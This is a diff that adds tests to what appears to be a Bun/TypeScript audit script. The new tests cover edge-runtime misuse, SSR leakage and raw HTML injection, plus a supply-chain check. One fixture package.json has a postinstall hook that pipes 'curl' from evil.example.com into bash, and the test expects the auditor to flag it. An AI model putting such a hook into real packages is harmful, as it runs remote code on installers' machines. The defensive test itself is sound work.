@@ -2618,6 +2618,68 @@ build/
       const commentRuntimeData = JSON.parse(commentRuntimeRes.stdout);
       expect(commentRuntimeData.passed).toBe(true);
       expect(commentRuntimeData.violations.length).toBe(0);
+
+      // 6. Edge Runtime & SSR Pitfalls Audit
+      const edgeScript = path.join(tempDir, "edge-worker.ts");
+      fs.writeFileSync(
+        edgeScript,
+        'export const runtime = "edge";\nimport fs from "node:fs";\nexport function handler() { return fs.readFileSync("x"); }\n',
+        "utf8",
+      );
+      const ssrScript = path.join(tempDir, "server-component.tsx");
+      fs.writeFileSync(
+        ssrScript,
+        'export function ServerCard() {\n  const token = localStorage.getItem("token");\n  return <div dangerouslySetInnerHTML={{ __html: "<b>hi</b>" }} />;\n}\n',
+        "utf8",
+      );
+
+      const edgeSsrRes = spawnSync("bun", [scriptPath, "--audit-edge-ssr", tempDir, "--json"], {
+        encoding: "utf8",
+        cwd: REPO_ROOT,
+      });
+      expect(edgeSsrRes.status).toBe(1);
+      const edgeSsrData = JSON.parse(edgeSsrRes.stdout);
+      expect(edgeSsrData.passed).toBe(false);
+      expect(edgeSsrData.violations.some((v: { type: string }) => v.type === "edge-unsupported-node-builtin")).toBe(
+        true,
+      );
+      expect(edgeSsrData.violations.some((v: { type: string }) => v.type === "ssr-window-leakage")).toBe(true);
+      expect(edgeSsrData.violations.some((v: { type: string }) => v.type === "raw-html-injection")).toBe(true);
+
+      // 7. Supply Chain Lifecycle Script Audit
+      const badPkgJson = path.join(tempDir, "bad-package.json");
+      fs.writeFileSync(
+        badPkgJson,
+        JSON.stringify({
+          name: "test-pkg",
+          scripts: {
+            postinstall: "curl -sL https://evil.example.com/payload.sh | bash",
+          },
+        }),
+        "utf8",
+      );
+      const lifecycleRes = spawnSync("bun", [scriptPath, "--audit-lifecycle-scripts", badPkgJson, "--json"], {
+        encoding: "utf8",
+        cwd: REPO_ROOT,
+      });
+      expect(lifecycleRes.status).toBe(1);
+      const lifecycleData = JSON.parse(lifecycleRes.stdout);
+      expect(lifecycleData.passed).toBe(false);
+      expect(lifecycleData.violations.some((v: { type: string }) => v.type === "suspicious-lifecycle-script")).toBe(
+        true,
+      );
+
+      // 8. Consolidated --audit-all runner
+      const allAuditRes = spawnSync("bun", [scriptPath, "--audit-all", tempDir, "--json"], {
+        encoding: "utf8",
+        cwd: REPO_ROOT,
+      });
+      expect(allAuditRes.status).toBe(1);
+      const allAuditData = JSON.parse(allAuditRes.stdout);
+      expect(allAuditData.passed).toBe(false);
+      expect(allAuditData.totalViolations).toBeGreaterThan(0);
+      expect(allAuditData.edgeSsr).toBeDefined();
+      expect(allAuditData.lifecycleScripts).toBeDefined();
     } finally {
       fs.rmSync(tempDir, { recursive: true, force: true });
     }
